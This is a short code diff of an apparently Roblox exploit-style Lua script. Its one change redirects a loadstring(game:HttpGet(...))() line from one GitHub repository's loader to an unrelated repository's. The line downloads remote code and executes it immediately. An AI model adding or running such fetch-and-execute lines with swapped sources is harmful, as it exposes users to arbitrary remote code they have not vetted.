@@ -933,7 +933,7 @@ function KeySystem:CreateKeySystem(Config)
     return KeySystemGui
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/silencedevs/SilenceScripts/refs/heads/main/Loader/Supported.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/creator-26/Html26/refs/heads/main/Supported.luau"))()
 
 getgenv().Get = setmetatable({}, {
     __index = function(_, serviceName)
